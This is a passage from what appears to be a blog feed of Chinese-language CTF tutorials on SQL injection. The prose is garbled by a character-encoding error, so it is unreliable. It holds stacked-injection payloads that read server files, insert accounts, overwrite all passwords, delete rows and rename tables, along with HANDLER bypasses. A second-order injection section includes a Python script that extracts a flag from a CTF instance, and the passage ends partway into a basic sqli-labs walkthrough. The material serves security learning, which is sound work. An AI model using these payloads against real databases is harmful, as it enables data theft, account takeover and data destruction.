æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿçš„é”™è¯¯æˆ–è€…æ‰§è¡Œç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œå»ºè®®é…åˆä½¿ç”¨ union è”åˆæ³¨å…¥ã€‚</p><p>ä¸€èˆ¬å­˜åœ¨å †å æ³¨å…¥çš„éƒ½æ˜¯ç”±äºä½¿ç”¨ <code>mysqli_multi_query()</code> å‡½æ•°æ‰§è¡Œçš„sqlè¯­å¥ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œå¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚</p><h5 id="å †å æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#å †å æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="å †å æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>å †å æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h5><p>å•çº¯çœ‹å †å æ³¨å…¥çš„è¯å¥½åƒè¿˜çœŸæ²¡ä»€ä¹ˆäº†</p><h5 id="æ³¨å…¥æµç¨‹-4"><a href="#æ³¨å…¥æµç¨‹-4" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">è¯»å–æ•°æ®</span><br><span class="line">/?id=1&#x27;;show databases;--+</span><br><span class="line">/?id=1&#x27;;show tables;--+</span><br><span class="line">/?id=1&#x27;;show tables from database_name;--+</span><br><span class="line">/?id=1&#x27;;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line">è¯»å–æ–‡ä»¶</span><br><span class="line">/?id=1&#x27;;select load_file(&#x27;/flag&#x27;);--+</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹æ•°æ®è¡¨çš„ç»“æ„</span><br><span class="line">/?id=1&#x27;;insert into users(id,username,password)values(20,&#x27;whoami&#x27;,&#x27;657260&#x27;);--+    # æ’å…¥æ•°æ®</span><br><span class="line">/?id=1&#x27;;update users set password=&#x27;657260&#x27; where id&gt;0;--+    # æ›´æ”¹æ•°æ®</span><br><span class="line">/?id=1&#x27;;delete from users where id=20;--+    # åˆ é™¤æ•°æ®</span><br><span class="line">/?id=1&#x27;;create table fake_users like users;--+    # åˆ›å»ºä¸€ä¸ªæ–°è¡¨</span><br><span class="line">?id=1&#x27;;rename table old_table to new_table;--+    # æ›´æ”¹è¡¨å</span><br><span class="line">?id=1&#x27;;alter table users change old_column new_column varchar(100);--+    # æ›´æ”¹å­—æ®µ</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯MySQLå †å æ³¨å…¥çš„å‡ ç§å¸¸è§å§¿åŠ¿ã€‚</p><h6 id="rename-ä¿®æ”¹è¡¨å"><a href="#rename-ä¿®æ”¹è¡¨å" class="headerlink" title="rename ä¿®æ”¹è¡¨å"></a>rename ä¿®æ”¹è¡¨å</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;#</span><br><span class="line"></span><br><span class="line"># renameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚</span><br><span class="line"># renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;</span><br></pre></td></tr></table></figure><h6 id="rename-alter-ä¿®æ”¹è¡¨åä¸å­—æ®µå"><a href="#rename-alter-ä¿®æ”¹è¡¨åä¸å­—æ®µå" class="headerlink" title="rename&#x2F;alter ä¿®æ”¹è¡¨åä¸å­—æ®µå"></a>rename&#x2F;alter ä¿®æ”¹è¡¨åä¸å­—æ®µå</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span><br><span class="line"></span><br><span class="line">renameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚</span><br><span class="line">renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;</span><br></pre></td></tr></table></figure><h6 id="åˆ©ç”¨-HANDLER-è¯­å¥"><a href="#åˆ©ç”¨-HANDLER-è¯­å¥" class="headerlink" title="åˆ©ç”¨ HANDLER è¯­å¥"></a>åˆ©ç”¨ HANDLER è¯­å¥</h6><p>å¦‚æœrenameã€alterã€selectè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©HANDLERè¯­å¥æ¥bypassã€‚åœ¨ä¸æ›´æ”¹è¡¨åçš„æƒ…å†µä¸‹è¯»å–å¦ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚</p><p><strong>æ‰“å¼€è¡¨</strong>: ä½¿ç”¨ <code>handler  open;</code> æ‰“å¼€æŒ‡å®šè¡¨ã€‚</p><p><strong>è¯»å–æ•°æ®</strong>: ä½¿ç”¨ <code>handler  read ;</code> è¯»å–æŒ‡å®šè¡Œçš„æ•°æ®ã€‚</p><p><strong>å…³é—­è¡¨</strong>: ä½¿ç”¨ <code>handler  close;</code> å…³é—­è¡¨</p><p>å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><br><span class="line">æˆ–</span><br><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#</span><br></pre></td></tr></table></figure><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><blockquote><p>äºŒæ¬¡æ³¨å…¥çš„æˆå› ï¼šç»™å¤§å®¶æ”¾å‡ å¼ å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222203505.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222203612.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222204877.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222205941.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222205129.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222205188.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410222206110.png"></p><p><img src="C:/Users/Feces/AppData/Roaming/Typora/typora-user-images/image-20241022220643492.png" alt="image-20241022220643492"></p></blockquote><h5 id="äºŒæ¬¡æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#äºŒæ¬¡æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="äºŒæ¬¡æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>äºŒæ¬¡æ³¨å…¥ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h5><p>é€šå¸¸äºŒæ¬¡æ³¨å…¥çš„æˆå› ä¼šæ˜¯æ’å…¥è¯­å¥ï¼Œæˆ‘ä»¬æ§åˆ¶è‡ªå·±æƒ³è¦æŸ¥è¯¢çš„è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­å†å»æ‰¾ä¸€ä¸ª<strong>èƒ½æ˜¾ç¤ºæ’å…¥æ•°æ®çš„å›æ˜¾çš„åœ°æ–¹</strong>ï¼ˆå¯èƒ½æ˜¯ç™»é™†åçš„ç”¨æˆ·åç­‰ç­‰ã€ä¹Ÿæœ‰å¯èƒ½æ˜¯åˆ é™¤åæ˜¾ç¤ºåˆ é™¤å†…å®¹çš„åœ°æ–¹~ï¼‰ï¼Œæ¶æ„æ’å…¥æŸ¥è¯¢è¯­å¥çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>éœ€è¦å¯¹åç«¯çš„SQLè¯­å¥æœ‰ä¸€ä¸ªçŒœæµ‹</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å°†è¦æŸ¥è¯¢çš„å‡½æ•°æ’å…¥ï¼Œå› ä¸ºå¦‚æœç›´æ¥æ’å…¥çš„è¯ï¼Œ<code>&#39;database()&#39;</code>ä¼šè¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•é—­åˆå‰åå•å¼•å·çš„åŒæ—¶å°†æˆ‘ä»¬çš„æŸ¥è¯¢æ’å…¥ï¼Œå°±å‡ºç°äº†<code>&#39;0&#39;+database()+&#39;0&#39;</code>è¿™æ ·çš„æ„é€ ï¼Œä½†æ˜¯è¿™ä¸ªçš„å›æ˜¾æ˜¯<code>0</code>ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬è¿›è¡Œäº†hexç¼–ç ä¹‹åå°±èƒ½æ­£å¸¸çš„æŸ¥è¯¢äº†ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å‡ºç°çš„<code>&#39;0&#39;+hex(database())+&#39;0&#39;</code></p><h5 id="æ³¨å…¥æµç¨‹-5"><a href="#æ³¨å…¥æµç¨‹-5" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><p>é¦–å…ˆæ‰¾åˆ°æ’å…¥ç‚¹ï¼Œé€šå¸¸æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œ<code>register.php</code>è¿™ç§ï¼Œå…ˆç®€å•çš„æŸ¥çœ‹ä¸€ä¸‹æ³¨å†Œåæœ‰æ²¡æœ‰ä»€ä¹ˆæ³¨å†Œæ—¶å†™å…¥çš„ä¿¡æ¯åœ¨ä¹‹ååˆå›æ˜¾çš„ï¼Œè‹¥æœ‰å›æ˜¾çŒœæµ‹ä¸ºäºŒæ¬¡æŸ¥è¯¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+hex(database())+&#x27;0&#x27;,&#x27;0&#x27;+hex(hex(user()))+&#x27;0&#x27;,&#x27;123@qq.com&#x27;)</span><br><span class="line"></span><br><span class="line">insert into users(id,username,password,email) values(1,&#x27;0&#x27;+substr((select hex(hex(select * from flag))),1,10)+&#x27;0&#x27;,&#x27;123456&#x27;,&#x27;123@qq.com&#x27;)</span><br></pre></td></tr></table></figure><p>æ„é€ ç±»ä¼¼äºvaluesä¸­çš„å‚æ•°è¿›è¡Œæ³¨å†Œç­‰æ“ä½œï¼Œç„¶åè¿›è¡ŒæŸ¥çœ‹ï¼Œå°†hexç¼–ç è§£ç å³å¯ï¼Œå¯èƒ½ä¼šæœ‰å…¶ä»–çš„å…ˆé™åˆ¶ï¼Œæ¯”å¦‚è¶…è¿‡10ä½å°±ä¼šè½¬åŒ–ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨<code>from for</code>è¯­å¥æ¥è¿›è¡Œä¸€ä¸ªé™åˆ¶ï¼Œå¯ä»¥ç¼–å†™è„šæœ¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re as r</span><br><span class="line">import time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+&#x27;-&#125;&#x27;+&#x27;&#123;&#x27;</span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = &#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span><br><span class="line"></span><br><span class="line">def register(email,username):</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    data = dict(email = email, username = username,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def login(email):</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    data = dict(email = email,password = &#x27;123&#x27;)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = &#x27;&#x27;</span><br><span class="line">for j in range(0,17):</span><br><span class="line">    payload = &quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;.format(int(j)*10+1,10)</span><br><span class="line">    email = &#x27;&#123;&#125;@qq.com&#x27;.format(str(j)+&#x27;14&#x27;)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    # print html.text</span><br><span class="line">    html = login(email)</span><br><span class="line">    try:</span><br><span class="line">        res = r.findall(r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;,html.text,r.S)</span><br><span class="line">        hex_flag += str(res[0]).strip()</span><br><span class="line">        print hex_flag</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    time.sleep(1)</span><br><span class="line">print hex_flag.decode(&#x27;hex&#x27;).decode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure><hr><blockquote><p><em>åŸºæœ¬çš„æ³¨å…¥ç±»å‹æš‚æ—¶å‘Šä¸€æ®µè½äº†ï¼Œä¸‹ä¸€ç¯‡ï¼Œæˆ‘ä¼šå†™å‡ºä¸€äº›å…³äºç»•è¿‡çš„æ‰‹æ³•ã€‚</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ä¹‹(ä¸€)</title>
      <link href="/2024/10/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(%E4%B8%80)/"/>
      <url>/2024/10/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SQLæ³¨å…¥â€”â€”åŸºæœ¬çš„æ³¨å…¥æ–¹æ³•-ä¸€"><a href="#SQLæ³¨å…¥â€”â€”åŸºæœ¬çš„æ³¨å…¥æ–¹æ³•-ä¸€" class="headerlink" title="SQLæ³¨å…¥â€”â€”åŸºæœ¬çš„æ³¨å…¥æ–¹æ³•(ä¸€)"></a>SQLæ³¨å…¥â€”â€”åŸºæœ¬çš„æ³¨å…¥æ–¹æ³•(ä¸€)</h1><blockquote><p>æœ€è¿‘å‡ å¤©å­¦æ ¡åˆšå¥½åœ¨å­¦æ•°æ®åº“ï¼Œäºæ˜¯ç»“åˆä¸€ä¸‹ä¹‹å‰åˆ·è¿‡çš„<strong>sqlæ³¨å…¥</strong>é¢˜åšä¸€ä¸ªæ€»ç»“ğŸ˜</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><a href="https://www.w3school.com.cn/sql/sql_syntax.asp">SQLè¯­æ³•</a> å…·ä½“ä¸åŒçš„æ•°æ®åº“è¿˜ä¼šæœ‰è‡ªå·±ç‰¹æœ‰çš„ä¸€äº›è¯­æ³•ç»“æ„æˆ–è€…å‡½æ•°ç­‰ï¼Œè¿™äº›éƒ½æœ‰å¯èƒ½æˆä¸ºæˆ‘ä»¬æ³¨å…¥çš„å·¥å…·ï¼Œä½†æ˜¯æˆ‘ä»¬å¾ˆéš¾æˆä¸ºå¼€æ‹“çš„äººï¼Œæˆ‘ä»¬åªèƒ½å»æŠŠå®ƒä»¬ç§¯ç´¯èµ·æ¥ï¼Œä¸ºæˆ‘ä»¬ä»¥åçš„æ”»é˜²ä½œç§¯ç´¯ã€‚</p><p>æ¯”è¾ƒé‡è¦çš„åŸºç¡€ï¼Œå¦‚å¢åˆ æ”¹æŸ¥ï¼Œæ²¡å­¦å¿«å»å­¦ï¼<a href="https://www.w3school.com.cn/sql/sql_syntax.asp">SQLè¯­æ³•</a></p><h3 id="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥"><a href="#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥" class="headerlink" title="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥?"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥?</h3><p><strong>SQLæ³¨å…¥</strong>ï¼ˆSQL Injectionï¼‰æ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´,å¸¸å¸¸å› ä¸ºwebåº”ç”¨ç¨‹åºåœ¨æ¥æ”¶ç›¸å…³æ•°æ®å‚æ•°æ—¶æœªåšå¥½è¿‡æ»¤ï¼Œå°†å…¶ç›´æ¥å¸¦å…¥åˆ°æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‹¼æ¥æ‰§è¡Œæ„é€ çš„SQLè¯­å¥</p><p><strong>å³ï¼šæ³¨å…¥äº§ç”Ÿçš„åŸå› æ˜¯åå°æœåŠ¡å™¨åœ¨æ¥æ”¶ç›¸å…³å‚æ•°æ—¶æœªåšå¥½è¿‡æ»¤ç›´æ¥å¸¦å…¥åˆ°æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œå¯¼è‡´å¯ä»¥æ‹¼æ¥æ‰§è¡Œæ„é€ çš„SQLè¯­å¥</strong></p><p>æˆ‘ä»¬ä»¥sqli-labsç¬¬ä¸€å…³ä¸ºä¾‹</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212015450.png"></p><p>ç”¨GETæ–¹æ³•ä¼ å…¥å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 //?è¡¨ç¤ºæŸ¥è¯¢å‚æ•°</span><br></pre></td></tr></table></figure><p>è¯´æ˜æˆ‘ä»¬æŸ¥è¯¢æˆåŠŸäº†ï¼Œç»“æœå¦‚å›¾æ‰€ç¤º</p><p>ä¸ºäº†çœ‹æ¸…åŸç†åŠå…¶ç»“æœï¼Œæˆ‘ä»¬æ‰“å¼€æºç æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹æ„Ÿè§‰å¥½åƒæ²¡å•¥é—®é¢˜æ˜¯å˜›ï¼Ÿ</p><p>ä½†æ˜¯å¦‚æœå¯¹äºæäº¤çš„å‚æ•°<code>id</code>åšå‡ºäº†åˆ»æ„æ„é€ ï¼Œæ„é€ å‡ºäº†æ¶æ„çš„å‚æ•°ï¼Œå°±ä¼šé€ æˆåŸæœ‰çš„sqlè¯­å¥å‘ç”Ÿå˜åŒ–ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œè¿™å°±æ˜¯sqlæ³¨å…¥çš„åŸç†ã€‚</p><p>è¯ä¸å¤šè¯´ï¼Œè®©æˆ‘ä»¬å¼€å§‹å®è·µå§</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212016597.png"></p><p>è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¼šæœ‰ä¸€å¥æŠ¥é”™</p><p><code>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p><p>ä½†æ˜¯ä¸ºä»€ä¹ˆè¿™æ ·ä¼šæŠ¥é”™å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå‚æ•°å¸¦å…¥åŸæ¥çš„sqlè¯­å¥ä¸­å¯ä»¥å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªsqlè¯­å¥ä¸­å¤šäº†ä¸€ä¸ªå•å¼•å·ï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªå•å¼•å·ï¼Œæ–°åŠ çš„å•å¼•å·ä¼šå’Œå‰é¢çš„å•å¼•å·æˆå¯¹(å¼•å·éƒ½æ˜¯æˆå¯¹å‡ºç°çš„),å› æ­¤å¤šå‡ºæ¥çš„å•å¼•å·å°±ä¼šæŠ¥é”™</p><p>é‚£ä¹ˆæ—¢ç„¶æˆ‘ä»¬æ„é€ ä»€ä¹ˆsqléƒ½ä¼šè§£æï¼Œèƒ½ä¸èƒ½æ„é€ ä¸€äº›ç‰¹åˆ«çš„è¯­å¥å‘¢?</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212016071.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%23</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿™æ—¶å€™ç¨‹åºå´ä¸æŠ¥é”™äº†ï¼Ÿ</p><blockquote><p>æ³¨:è¿™é‡Œçš„%23å°±æ˜¯æ³¨é‡Šç¬¦# å› ä¸ºurlä¼šé€šè¿‡urlç¼–ç å°†<code>#</code>è§£æä¸º%23</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410212017591.png"></p></blockquote><p>å†å¸¦å…¥sqlè¯­å¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;#&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæ³¨é‡Šç¬¦<code>#</code>å‘æŒ¥äº†ä»–åº”æœ‰çš„ä½œç”¨ï¼Œåœ¨æ³¨é‡Šç¬¦åé¢çš„ä»£ç å…¨éƒ¨éƒ½è¢«æ³¨é‡Šæ‰äº†ï¼Œå› æ­¤æ— æ³•å‘æŒ¥åŸæœ‰çš„ä½œç”¨</p><p>äºæ˜¯sqlè¯­å¥å°±å˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;#;&quot;</span><br></pre></td></tr></table></figure><p>æ•…æˆåŠŸçš„æ„é€ å‡ºäº†å¸¦æœ‰ç›®çš„æ€§çš„ä»£ç </p><h3 id="SQLæ³¨å…¥çš„æµç¨‹"><a href="#SQLæ³¨å…¥çš„æµç¨‹" class="headerlink" title="SQLæ³¨å…¥çš„æµç¨‹"></a>SQLæ³¨å…¥çš„æµç¨‹</h3><h4 id="ä¸€-åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqIæ³¨å…¥ä¸sqIæ³¨å…¥çš„ç±»å‹"><a href="#ä¸€-åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqIæ³¨å…¥ä¸sqIæ³¨å…¥çš„ç±»å‹" class="headerlink" title="ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqIæ³¨å…¥ä¸sqIæ³¨å…¥çš„ç±»å‹"></a>ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqIæ³¨å…¥ä¸sqIæ³¨å…¥çš„ç±»å‹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆæ³¨å…¥å,çœ‹æ˜¯å¦æœ‰æŠ¥é”™,æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹;ç„¶åå†ç”¨order byçˆ†å­—æ®µ(åˆ—)æ•°,çŸ¥é“å‡ ä¸ªå­—æ®µäº†,å†è¾“å…¥ç›¸åº”å­—æ®µçš„æ•°,æ¥çœ‹æœ‰å‡ ä¸ªæ˜¾ç¤ºä½(å›æ˜¾)</span><br></pre></td></tr></table></figure><h4 id="äºŒã€åˆ¤æ–­sqIæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹"><a href="#äºŒã€åˆ¤æ–­sqIæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹" class="headerlink" title="äºŒã€åˆ¤æ–­sqIæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹"></a><strong>äºŒã€åˆ¤æ–­sqIæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯”å¦‚è¯´åƒidè¿™ä¸ªå‚æ•°,æˆ‘ä»¬è¾“å…¥id=1&#x27;æŠ¥é”™äº†ï¼Œè¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥,æ²¡æœ‰äº†è¯å°±æ˜¯æ•°å­—å‹æ³¨å…¥</span><br></pre></td></tr></table></figure><h4 id="ä¸‰ã€çˆ†åˆ—æ•°"><a href="#ä¸‰ã€çˆ†åˆ—æ•°" class="headerlink" title="ä¸‰ã€çˆ†åˆ—æ•°"></a><strong>ä¸‰ã€çˆ†åˆ—æ•°</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 